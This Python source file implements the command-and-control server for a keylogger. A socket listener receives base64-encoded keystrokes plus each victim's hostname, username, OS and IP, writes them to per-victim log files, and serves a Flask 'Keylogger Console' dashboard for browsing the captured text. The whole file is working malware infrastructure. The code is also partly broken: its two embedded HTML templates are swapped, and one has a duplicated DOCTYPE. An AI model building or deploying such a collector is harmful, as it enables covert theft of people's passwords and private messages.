import socket
import threading
import json
import base64
import os
import time
from datetime import datetime
from flask import Flask, render_template, jsonify, request, send_from_directory
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='server_log.txt'
)
logger = logging.getLogger('keylogger_server')

# Server configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 8080        # Port to listen on
LOGS_DIR = 'client_logs'  # Directory to store client logs
WEB_PORT = 5000    # Port for web interface

# Ensure logs directory exists
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)
    logger.info(f"Created logs directory: {LOGS_DIR}")

# Dictionary to store connected clients
clients = {}
clients_lock = threading.Lock()

# Flask app for web interface
app = Flask(__name__)

@app.route('/')
def index():
    """Render the main page listing all clients"""
    return render_template('index.html')

@app.route('/client/<client_id>')
def client_logs(client_id):
    """Render page showing logs for a specific client"""
    client_dir = os.path.join(LOGS_DIR, client_id)
    if not os.path.exists(client_dir):
        return "Client not found", 404
    
    return render_template('client.html', client_id=client_id)

@app.route('/api/clients')
def get_clients():
    """API endpoint to get the list of clients"""
    client_list = []
    
    if not os.path.exists(LOGS_DIR):
        return jsonify({"clients": []})
    
    for client_dir in os.listdir(LOGS_DIR):
        client_path = os.path.join(LOGS_DIR, client_dir)
        if os.path.isdir(client_path):
            # Get client information
            machine_info = {}
            info_file = os.path.join(client_path, "client_info.json")
            if os.path.exists(info_file):
                try:
                    with open(info_file, 'r', encoding='utf-8') as f:
                        machine_info = json.load(f)
                except Exception as e:
                    logger.error(f"Error reading client info for {client_dir}: {e}")
                    machine_info = {}
            
            # Get the most recent log file
            log_files = [f for f in os.listdir(client_path) 
                        if f.endswith('.txt') and f != "client_info.txt"]
            
            last_seen = "N/A"
            last_seen_timestamp = 0
            
            if log_files:
                try:
                    latest_log = max(log_files, key=lambda x: os.path.getmtime(
                        os.path.join(client_path, x)))
                    log_path = os.path.join(client_path, latest_log)
                    if os.path.exists(log_path):
                        last_seen = datetime.fromtimestamp(os.path.getmtime(log_path)).strftime('%Y-%m-%d %H:%M:%S')
                        last_seen_timestamp = os.path.getmtime(log_path)
                except Exception as e:
                    logger.error(f"Error processing log files for {client_dir}: {e}")
                
            client_list.append({
                'id': client_dir,
                'hostname': machine_info.get('hostname', 'Unknown'),
                'os': machine_info.get('os', 'Unknown'),
                'username': machine_info.get('username', 'Unknown'),
                'last_seen': last_seen,
                'last_seen_timestamp': last_seen_timestamp,
                'online': client_dir in clients,
                'ip_address': machine_info.get('ip_address', 'Unknown')
            })
    
    # Sort by online status and then by last seen
    client_list.sort(key=lambda x: (-int(x['online']), -x['last_seen_timestamp']))
    
    return jsonify({"clients": client_list})

@app.route('/api/client/<client_id>/logs')
def get_client_logs(client_id):
    """API endpoint to get log files for a specific client"""
    client_dir = os.path.join(LOGS_DIR, client_id)
    if not os.path.exists(client_dir):
        return jsonify({"error": "Client not found"}), 404
    
    try:
        log_files = [f for f in os.listdir(client_dir) if f.endswith('.txt') and f != "client_info.txt"]
        
        # Sort log files by modification time (newest first)
        log_files.sort(key=lambda x: os.path.getmtime(os.path.join(client_dir, x)), reverse=True)
        
        log_data = []
        for log_file in log_files:
            file_path = os.path.join(client_dir, log_file)
            if os.path.exists(file_path):
                size = os.path.getsize(file_path)
                modified = datetime.fromtimestamp(os.path.getmtime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
                
                log_data.append({
                    'name': log_file,
                    'size': size,
                    'modified': modified,
                    'modified_timestamp': os.path.getmtime(file_path)
                })
        
        return jsonify({"logs": log_data})
    except Exception as e:
        logger.error(f"Error retrieving logs for {client_id}: {e}")
        return jsonify({"error": f"Error retrieving logs: {str(e)}"}), 500

@app.route('/api/client/<client_id>/info')
def get_client_info(client_id):
    """API endpoint to get detailed information about a client"""
    client_dir = os.path.join(LOGS_DIR, client_id)
    if not os.path.exists(client_dir):
        return jsonify({"error": "Client not found"}), 404
    
    info_file = os.path.join(client_dir, "client_info.json")
    info = {}
    
    if os.path.exists(info_file):
        try:
            with open(info_file, 'r', encoding='utf-8') as f:
                info = json.load(f)
        except Exception as e:
            logger.error(f"Error reading client info for {client_id}: {e}")
            info = {}
    
    # Add online status
    info['online'] = client_id in clients
    
    return jsonify(info)

@app.route('/api/client/<client_id>/log/<log_file>')
def get_log_content(client_id, log_file):
    """API endpoint to get the content of a specific log file"""
    # Validate the log file name to prevent directory traversal
    if '..' in log_file or '/' in log_file or '\\' in log_file:
        return jsonify({"error": "Invalid log file name"}), 400
    
    log_path = os.path.join(LOGS_DIR, client_id, log_file)
    if not os.path.exists(log_path) or not os.path.isfile(log_path):
        return jsonify({"error": "Log file not found"}), 404
    
    try:
        with open(log_path, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()
        
        return jsonify({"content": content})
    except Exception as e:
        logger.error(f"Error reading log file {log_file} for {client_id}: {e}")
        return jsonify({"error": f"Error reading log file: {str(e)}"}), 500

@app.route('/api/stats')
def get_stats():
    """API endpoint to get overall statistics"""
    total_clients = 0
    online_clients = 0
    total_logs = 0
    
    try:
        if os.path.exists(LOGS_DIR):
            for client_dir in os.listdir(LOGS_DIR):
                client_path = os.path.join(LOGS_DIR, client_dir)
                if os.path.isdir(client_path):
                    total_clients += 1
                    if client_dir in clients:
                        online_clients += 1
                    
                    log_files = [f for f in os.listdir(client_path) 
                                if f.endswith('.txt') and f != "client_info.txt"]
                    total_logs += len(log_files)
        
        return jsonify({
            "total_clients": total_clients,
            "online_clients": online_clients,
            "total_logs": total_logs,
            "server_uptime": int(datetime.now().timestamp() - server_start_time)
        })
    except Exception as e:
        logger.error(f"Error getting stats: {e}")
        return jsonify({
            "total_clients": 0,
            "online_clients": 0,
            "total_logs": 0,
            "server_uptime": int(datetime.now().timestamp() - server_start_time)
        })

def handle_client(client_socket, client_address):
    """Handle an individual client connection"""
    logger.info(f"New connection from {client_address}")
    
    try:
        # Set a timeout for receiving data
        client_socket.settimeout(10.0)
        
        data = client_socket.recv(4096)
        if not data:
            logger.warning(f"No data received from {client_address}")
            return
        
        # Parse the received data
        try:
            payload = json.loads(data.decode())
            machine_info = payload.get('machine_info', {})
            timestamp = payload.get('timestamp', datetime.now().isoformat())
            encoded_data = payload.get('data', '')
            
            # Add IP address to machine info
            machine_info['ip_address'] = client_address[0]
            
            # Decode the data
            decoded_data = base64.b64decode(encoded_data).decode('utf-8', errors='replace')
            
            # Create a unique identifier for this client
            client_id = f"{machine_info.get('hostname', 'unknown')}-{machine_info.get('username', 'unknown')}"
            client_id = client_id.replace(' ', '_').replace('/', '_').replace('\\', '_').replace(':', '_')
            
            # Create directory for this client if it doesn't exist
            client_dir = os.path.join(LOGS_DIR, client_id)
            if not os.path.exists(client_dir):
                os.makedirs(client_dir)
                logger.info(f"Created directory for new client: {client_id}")
            
            # Save machine info
            info_file = os.path.join(client_dir, "client_info.json")
            with open(info_file, 'w', encoding='utf-8') as f:
                json.dump(machine_info, f, indent=2)
            
            # Current log file for this client
            current_date = datetime.now().strftime('%Y%m%d')
            log_file = os.path.join(client_dir, f"keylog_{current_date}.txt")
            
            # Write the data to the log file
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] {decoded_data}\n")
            
            # Update the clients dictionary
            with clients_lock:
                clients[client_id] = {
                    'address': client_address,
                    'machine_info': machine_info,
                    'last_seen': timestamp
                }
            
            logger.info(f"Received data from {client_id} ({len(decoded_data)} characters)")
            
        except json.JSONDecodeError:
            logger.error(f"Failed to parse JSON from {client_address}")
        except Exception as e:
            logger.error(f"Error processing data from {client_address}: {e}")
    
    except socket.timeout:
        logger.warning(f"Connection timed out with {client_address}")
    except Exception as e:
        logger.error(f"Unexpected error handling client {client_address}: {e}")
    finally:
        client_socket.close()

def start_socket_server():
    """Start the socket server to listen for keylogger clients"""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        logger.info(f"Server listening on {HOST}:{PORT}")
        
        while True:
            try:
                client_socket, client_address = server_socket.accept()
                client_thread = threading.Thread(target=handle_client, 
                                               args=(client_socket, client_address))
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                logger.error(f"Error accepting connection: {e}")
                time.sleep(1)  # Prevent CPU spinning if there's a persistent error
    
    except Exception as e:
        logger.error(f"Socket server error: {e}")
    finally:
        try:
            server_socket.close()
        except:
            pass

def check_client_timeouts():
    """Remove clients that haven't been seen in a while"""
    while True:
        try:
            with clients_lock:
                current_time = datetime.now()
                to_remove = []
                
                for client_id, client_data in list(clients.items()):
                    try:
                        last_seen = datetime.fromisoformat(client_data['last_seen'])
                        if (current_time - last_seen).total_seconds() > 300:  # 5 minutes timeout
                            to_remove.append(client_id)
                    except Exception as e:
                        logger.error(f"Error checking timeout for client {client_id}: {e}")
                        to_remove.append(client_id)
                
                for client_id in to_remove:
                    logger.info(f"Client timed out: {client_id}")
                    clients.pop(client_id, None)
        except Exception as e:
            logger.error(f"Error in check_client_timeouts: {e}")
        
        # Sleep for 1 minute before checking again
        time.sleep(60)

if __name__ == "__main__":
    # Record server start time
    server_start_time = datetime.now().timestamp()
    
    # Create HTML templates directory if it doesn't exist
    templates_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
    static_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
    
    if not os.path.exists(templates_dir):
        os.makedirs(templates_dir)
    if not os.path.exists(static_dir):
        os.makedirs(static_dir)
    
    # Create index.html template
    with open(os.path.join(templates_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write(r'''<!DOCTYPE html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Client Details</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --dark-bg: #1e2a38;
            --sidebar-bg: #0f1923;
            --primary-color: #3498db;
            --success-color: #2ecc71;
            --danger-color: #e74c3c;
            --warning-color: #f39c12;
            --content-bg: #131e29;
        }
        body {
            background-color: var(--dark-bg);
            color: #e9ecef;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .wrapper {
            display: flex;
            width: 100%;
        }
        #sidebar {
            min-width: 250px;
            max-width: 250px;
            background-color: var(--sidebar-bg);
            color: #fff;
            transition: all 0.3s;
            height: 100vh;
            position: fixed;
        }
        #content {
            width: calc(100% - 250px);
            padding: 20px;
            margin-left: 250px;
            transition: all 0.3s;
        }
        .sidebar-header {
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.2);
        }
        .sidebar-nav {
            padding: 0;
            list-style-type: none;
        }
        .sidebar-nav li {
            padding: 10px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .sidebar-nav li a {
            color: #fff;
            text-decoration: none;
            display: block;
        }
        .sidebar-nav li:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }
        .sidebar-nav li.active {
            background-color: var(--primary-color);
        }
        .card {
            background-color: var(--content-bg);
            border: none;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        .card-header {
            background-color: rgba(0, 0, 0, 0.2);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding: 15px 20px;
        }
        .table {
            color: #e9ecef;
        }
        .table thead th {
            border-bottom: 2px solid rgba(255, 255, 255, 0.1);
        }
        .table td, .table th {
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            vertical-align: middle;
        }
        .table-hover tbody tr:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }
        .badge-online {
            background-color: var(--success-color);
        }
        .badge-offline {
            background-color: var(--danger-color);
        }
        .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
        }
        .btn-primary:hover {
            background-color: #2980b9;
            border-color: #2980b9;
        }
        .log-content {
            background-color: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
            padding: 15px;
            margin-top: 15px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 500px;
            overflow-y: auto;
        }
        .client-info-item {
            padding: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .client-info-item strong {
            color: var(--primary-color);
        }
        .loading {
            text-align: center;
            padding: 20px;
        }
        .loading i {
            font-size: 30px;
            color: var(--primary-color);
        }
        .log-select {
            max-height: 400px;
            overflow-y: auto;
        }
        .back-link {
            margin-bottom: 20px;
            display: inline-block;
            color: var(--primary-color);
            text-decoration: none;
        }
        .back-link:hover {
            text-decoration: underline;
            color: #2980b9;
        }
        .timestamp {
            color: var(--warning-color);
        }
        .key-special {
            color: var(--danger-color);
        }
        .no-logs {
            text-align: center;
            padding: 20px;
            color: #adb5bd;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <!-- Sidebar -->
        <nav id="sidebar">
            <div class="sidebar-header">
                <h4><i class="fas fa-keyboard me-2"></i>Keylogger Console</h4>
            </div>
            <ul class="sidebar-nav">
                <li><a href="/"><i class="fas fa-tachometer-alt me-2"></i>Dashboard</a></li>
                <li class="active"><a href="#"><i class="fas fa-users me-2"></i>Clients</a></li>
                <li><a href="#"><i class="fas fa-chart-line me-2"></i>Analytics</a></li>
                <li><a href="#"><i class="fas fa-cog me-2"></i>Settings</a></li>
            </ul>
        </nav>

        <!-- Content -->
        <div id="content">
            <div class="container-fluid">
                <div class="row mb-4">
                    <div class="col-md-12">
                        <a href="/" class="back-link"><i class="fas fa-arrow-left me-2"></i>Back to Dashboard</a>
                        <h2><i class="fas fa-laptop me-2"></i>Client Details: <span id="client-title">Loading...</span></h2>
                        <p class="text-muted">View and analyze keylogger data for this client</p>
                    </div>
                </div>
                
                <div class="row">
                    <!-- Client Information Card -->
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">
                                <h5 class="mb-0"><i class="fas fa-info-circle me-2"></i>Client Information</h5>
                            </div>
                            <div class="card-body" id="client-info">
                                <div class="loading">
                                    <i class="fas fa-spinner fa-spin"></i>
                                    <p>Loading client information...</p>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Log Files Card -->
                        <div class="card">
                            <div class="card-header">
                                <h5 class="mb-0"><i class="fas fa-file-alt me-2"></i>Log Files</h5>
                            </div>
                            <div class="card-body">
                                <div class="log-select list-group" id="log-files-list">
                                    <div class="loading">
                                        <i class="fas fa-spinner fa-spin"></i>
                                        <p>Loading log files...</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Log Content Card -->
                    <div class="col-md-8">
                        <div class="card">
                            <div class="card-header d-flex justify-content-between align-items-center">
                                <h5 class="mb-0"><i class="fas fa-file-alt me-2"></i>Log Content: <span id="current-log">No log selected</span></h5>
                                <button class="btn btn-primary btn-sm" id="refresh-log-btn" disabled>
                                    <i class="fas fa-sync-alt me-1"></i> Refresh
                                </button>
                            </div>
                            <div class="card-body">
                                <div id="log-content" class="log-content">
                                    <p class="text-center text-muted">Select a log file to view its contents.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Get client ID from URL
        const clientId = window.location.pathname.split('/').pop();
        let currentLogFile = null;
        
        // Load client information
        function loadClientInfo() {
            fetch(`/api/client/${clientId}/info`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Client not found');
                    }
                    return response.json();
                })
                .then(data => {
                    document.getElementById('client-title').textContent = data.hostname || clientId;
                    
                    const clientInfoElement = document.getElementById('client-info');
                    clientInfoElement.innerHTML = '';
                    
                    // Display client information
                    const infoItems = [
                        { label: 'Hostname', value: data.hostname || 'Unknown' },
                        { label: 'Operating System', value: data.os || 'Unknown' },
                        { label: 'Username', value: data.username || 'Unknown' },
                        { label: 'IP Address', value: data.ip_address || 'Unknown' },
                        { label: 'Status', value: data.online ? 'Online' : 'Offline', 
                          className: data.online ? 'text-success' : 'text-danger' }
                    ];
                    
                    infoItems.forEach(item => {
                        const div = document.createElement('div');
                        div.className = 'client-info-item';
                        div.innerHTML = `<strong>${item.label}:</strong> <span class="${item.className || ''}">${item.value}</span>`;
                        clientInfoElement.appendChild(div);
                    });
                    
                    // Add any additional information
                    if (data.additional_info) {
                        const additionalDiv = document.createElement('div');
                        additionalDiv.className = 'client-info-item';
                        additionalDiv.innerHTML = `<strong>Additional Info:</strong><br>${data.additional_info}`;
                        clientInfoElement.appendChild(additionalDiv);
                    }
                })
                .catch(error => {
                    console.error('Error loading client info:', error);
                    document.getElementById('client-info').innerHTML = `
                        <div class="alert alert-danger">
                            Error loading client information: ${error.message}
                        </div>
                    `;
                });
        }
        
        // Load log files
        function loadLogFiles() {
            fetch(`/api/client/${clientId}/logs`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Client not found');
                    }
                    return response.json();
                })
                .then(data => {
                    const logFilesElement = document.getElementById('log-files-list');
                    logFilesElement.innerHTML = '';
                    
                    if (!data.logs || data.logs.length === 0) {
                        logFilesElement.innerHTML = `
                            <div class="no-logs">
                                <i class="fas fa-exclamation-circle mb-2"></i>
                                <p>No log files available.</p>
                            </div>
                        `;
                        return;
                    }
                    
                    // Display log files
                    data.logs.forEach(log => {
                        const logItem = document.createElement('a');
                        logItem.href = '#';
                        logItem.className = 'list-group-item list-group-item-action d-flex justify-content-between align-items-center bg-transparent text-light';
                        logItem.innerHTML = `
                            <span>
                                <i class="fas fa-file-alt me-2"></i>${log.name}
                            </span>
                            <span class="text-muted small">${log.modified}</span>
                        `;
                        
                        logItem.addEventListener('click', (e) => {
                            e.preventDefault();
                            // Remove active class from all items
                            document.querySelectorAll('#log-files-list a').forEach(item => {
                                item.classList.remove('active');
                            });
                            // Add active class to clicked item
                            logItem.classList.add('active');
                            
                            // Load log content
                            loadLogContent(log.name);
                        });
                        
                        logFilesElement.appendChild(logItem);
                    });
                    
                    // If there are logs, automatically select the first one
                    if (data.logs.length > 0) {
                        const firstLogItem = logFilesElement.querySelector('a');
                        if (firstLogItem) {
                            firstLogItem.classList.add('active');
                            loadLogContent(data.logs[0].name);
                        }
                    }
                })
                .catch(error => {
                    console.error('Error loading log files:', error);
                    document.getElementById('log-files-list').innerHTML = `
                        <div class="alert alert-danger">
                            Error loading log files: ${error.message}
                        </div>
                    `;
                });
        }
        
        // Load log content
        function loadLogContent(logFileName) {
            currentLogFile = logFileName;
            document.getElementById('current-log').textContent = logFileName;
            document.getElementById('refresh-log-btn').disabled = false;
            
            const logContentElement = document.getElementById('log-content');
            logContentElement.innerHTML = `
                <div class="loading">
                    <i class="fas fa-spinner fa-spin"></i>
                    <p>Loading log content...</p>
                </div>
            `;
            
            fetch(`/api/client/${clientId}/log/${logFileName}`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Log file not found');
                    }
                    return response.json();
                })
                .then(data => {
                    let formattedContent = '';
                    
                    if (data.content) {
                        // Simple formatting for readability
                        formattedContent = data.content
                            .replace(/\[([^\]]+)\]/g, '<span class="timestamp">[$1]</span>')
                            .replace(/\[BACKSPACE\]/g, '<span class="key-special">[BACKSPACE]</span>')
                            .replace(/\[ENTER\]/g, '<span class="key-special">[ENTER]</span>')
                            .replace(/\[TAB\]/g, '<span class="key-special">[TAB]</span>')
                            .replace(/\[SPACE\]/g, ' '); // Replace [SPACE] with actual space
                    } else {
                        formattedContent = '<p class="text-muted">Log file is empty.</p>';
                    }
                    
                    logContentElement.innerHTML = formattedContent;
                })
                .catch(error => {
                    console.error('Error loading log content:', error);
                    logContentElement.innerHTML = `
                        <div class="alert alert-danger">
                            Error loading log content: ${error.message}
                        </div>
                    `;
                });
        }
        
        // Refresh current log
        document.getElementById('refresh-log-btn').addEventListener('click', () => {
            if (currentLogFile) {
                loadLogContent(currentLogFile);
            }
        });
        
        // Load data when page loads
        window.addEventListener('DOMContentLoaded', () => {
            loadClientInfo();
            loadLogFiles();
            
            // Refresh data every 30 seconds
            setInterval(() => {
                loadClientInfo();
                
                // If a log file is selected, refresh it too
                if (currentLogFile) {
                    loadLogContent(currentLogFile);
                }
            }, 30000);
        });
    </script>
</body>
</html>
''')
    
    # Create client.html template
    with open(os.path.join(templates_dir, 'client.html'), 'w', encoding='utf-8') as f:
        f.write(r'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --dark-bg: #1e2a38;
            --sidebar-bg: #0f1923;
            --primary-color: #3498db;
            --success-color: #2ecc71;
            --danger-color: #e74c3c;
            --warning-color: #f39c12;
            --content-bg: #131e29;
        }
        body {
            background-color: var(--dark-bg);
            color: #e9ecef;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .wrapper {
            display: flex;
            width: 100%;
        }
        #sidebar {
            min-width: 250px;
            max-width: 250px;
            background-color: var(--sidebar-bg);
            color: #fff;
            transition: all 0.3s;
            height: 100vh;
            position: fixed;
        }
        #content {
            width: calc(100% - 250px);
            padding: 20px;
            margin-left: 250px;
            transition: all 0.3s;
        }
        .sidebar-header {
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.2);
        }
        .sidebar-nav {
            padding: 0;
            list-style-type: none;
        }
        .sidebar-nav li {
            padding: 10px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .sidebar-nav li a {
            color: #fff;
            text-decoration: none;
            display: block;
        }
        .sidebar-nav li:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }
        .sidebar-nav li.active {
            background-color: var(--primary-color);
        }
        .card {
            background-color: var(--content-bg);
            border: none;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        .card-header {
            background-color: rgba(0, 0, 0, 0.2);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding: 15px 20px;
        }
        .table {
            color: #e9ecef;
        }
        .table thead th {
            border-bottom: 2px solid rgba(255, 255, 255, 0.1);
        }
        .table td, .table th {
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            vertical-align: middle;
        }
        .table-hover tbody tr:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }
        .badge-online {
            background-color: var(--success-color);
        }
        .badge-offline {
            background-color: var(--danger-color);
        }
        .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
        }
        .btn-primary:hover {
            background-color: #2980b9;
            border-color: #2980b9;
        }
        .stats-item {
            background-color: var(--content-bg);
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .stats-item i {
            font-size: 36px;
            color: var(--primary-color);
            margin-bottom: 10px;
        }
        .stats-item h3 {
            font-size: 28px;
            margin: 10px 0;
        }
        .stats-item p {
            color: #adb5bd;
            margin: 0;
        }
        .loading {
            text-align: center;
            padding: 20px;
        }
        .loading i {
            font-size: 30px;
            color: var(--primary-color);
        }
        .client-row:hover {
            cursor: pointer;
        }
        .uptime {
            font-size: 16px;
            color: #adb5bd;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <!-- Sidebar -->
        <nav id="sidebar">
            <div class="sidebar-header">
                <h4><i class="fas fa-keyboard me-2"></i>Keylogger Console</h4>
            </div>
            <ul class="sidebar-nav">
                <li class="active"><a href="/"><i class="fas fa-tachometer-alt me-2"></i>Dashboard</a></li>
                <li><a href="#"><i class="fas fa-users me-2"></i>Clients</a></li>
                <li><a href="#"><i class="fas fa-chart-line me-2"></i>Analytics</a></li>
                <li><a href="#"><i class="fas fa-cog me-2"></i>Settings</a></li>
            </ul>
        </nav>

        <!-- Content -->
        <div id="content">
            <div class="container-fluid">
                <div class="row mb-4">
                    <div class="col-md-12">
                        <h2><i class="fas fa-tachometer-alt me-2"></i>Keylogger Dashboard</h2>
                        <p class="text-muted">Monitor and analyze keylogger clients</p>
                    </div>
                </div>
                
                <!-- Stats Cards -->
                <div class="row mb-4">
                    <div class="col-md-3">
                        <div class="stats-item">
                            <i class="fas fa-laptop"></i>
                            <h3 id="total-clients">-</h3>
                            <p>Total Clients</p>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="stats-item">
                            <i class="fas fa-wifi"></i>
                            <h3 id="online-clients">-</h3>
                            <p>Online Clients</p>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="stats-item">
                            <i class="fas fa-file-alt"></i>
                            <h3 id="total-logs">-</h3>
                            <p>Log Files</p>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="stats-item">
                            <i class="fas fa-clock"></i>
                            <div id="uptime">-</div>
                            <p>Server Uptime</p>
                        </div>
                    </div>
                </div>
                
                <!-- Clients Table Card -->
                <div class="card">
                    <div class="card-header d-flex justify-content-between align-items-center">
                        <h5 class="mb-0"><i class="fas fa-users me-2"></i>Connected Clients</h5>
                        <button class="btn btn-primary btn-sm" id="refresh-btn">
                            <i class="fas fa-sync-alt me-1"></i> Refresh
                        </button>
                    </div>
                    <div class="card-body">
                        <div class="table-responsive">
                            <table class="table table-hover">
                                <thead>
                                    <tr>
                                        <th>Status</th>
                                        <th>Hostname</th>
                                        <th>Username</th>
                                        <th>OS</th>
                                        <th>IP Address</th>
                                        <th>Last Seen</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="clients-table-body">
                                    <tr>
                                        <td colspan="7" class="text-center">
                                            <div class="loading">
                                                <i class="fas fa-spinner fa-spin"></i>
                                                <p>Loading clients...</p>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Format uptime
        function formatUptime(seconds) {
            const days = Math.floor(seconds / (3600 * 24));
            const hours = Math.floor((seconds % (3600 * 24)) / 3600);
            const minutes = Math.floor((seconds % 3600) / 60);
            
            let result = '<h3>';
            if (days > 0) result += `${days}d `;
            result += `${hours}h ${minutes}m</h3>`;
            
            return result;
        }
        
        // Load overall stats
        function loadStats() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('total-clients').textContent = data.total_clients;
                    document.getElementById('online-clients').textContent = data.online_clients;
                    document.getElementById('total-logs').textContent = data.total_logs;
                    document.getElementById('uptime').innerHTML = formatUptime(data.server_uptime);
                })
                .catch(error => {
                    console.error('Error loading stats:', error);
                });
        }
        
        // Load clients list
        function loadClients() {
            fetch('/api/clients')
                .then(response => response.json())
                .then(data => {
                    const tableBody = document.getElementById('clients-table-body');
                    tableBody.innerHTML = '';
                    
                    if (!data.clients || data.clients.length === 0) {
                        tableBody.innerHTML = `
                            <tr>
                                <td colspan="7" class="text-center">No clients found.</td>
                            </tr>
                        `;
                        return;
                    }
                    
                    data.clients.forEach(client => {
                        const row = document.createElement('tr');
                        row.className = 'client-row';
                        row.innerHTML = `
                            <td>
                                <span class="badge ${client.online ? 'badge-online' : 'badge-offline'} p-2">
                                    ${client.online ? 'Online' : 'Offline'}
                                </span>
                            </td>
                            <td>${client.hostname}</td>
                            <td>${client.username}</td>
                            <td>${client.os}</td>
                            <td>${client.ip_address}</td>
                            <td>${client.last_seen}</td>
                            <td>
                                <a href="/client/${client.id}" class="btn btn-primary btn-sm">
                                    <i class="fas fa-eye me-1"></i> View
                                </a>
                            </td>
                        `;
                        
                        // Add click event to navigate to client detail page
                        row.addEventListener('click', (e) => {
                            // Don't navigate if they clicked the action button (which has its own link)
                            if (!e.target.closest('.btn')) {
                                window.location.href = `/client/${client.id}`;
                            }
                        });
                        
                        tableBody.appendChild(row);
                    });
                })
                .catch(error => {
                    console.error('Error loading clients:', error);
                    document.getElementById('clients-table-body').innerHTML = `
                        <tr>
                            <td colspan="7" class="text-center text-danger">
                                Error loading clients: ${error.message}
                            </td>
                        </tr>
                    `;
                });
        }
        
        // Refresh button event
        document.getElementById('refresh-btn').addEventListener('click', () => {
            loadStats();
            loadClients();
        });
        
        // Load data when page loads
        window.addEventListener('DOMContentLoaded', () => {
            loadStats();
            loadClients();
            
            // Refresh data every 30 seconds
            setInterval(() => {
                loadStats();
                loadClients();
            }, 30000);
        });
    </script>
</body>
</html>
''')
    
    # Start the socket server in a separate thread
    server_thread = threading.Thread(target=start_socket_server)
    server_thread.daemon = True
    server_thread.start()
    
    # Start client timeout checker in a separate thread
    timeout_thread = threading.Thread(target=check_client_timeouts)
    timeout_thread.daemon = True
    timeout_thread.start()
    
    # Start the Flask web server
    logger.info(f"Starting web server on port {WEB_PORT}")
    app.run(host='0.0.0.0', port=WEB_PORT, debug=False)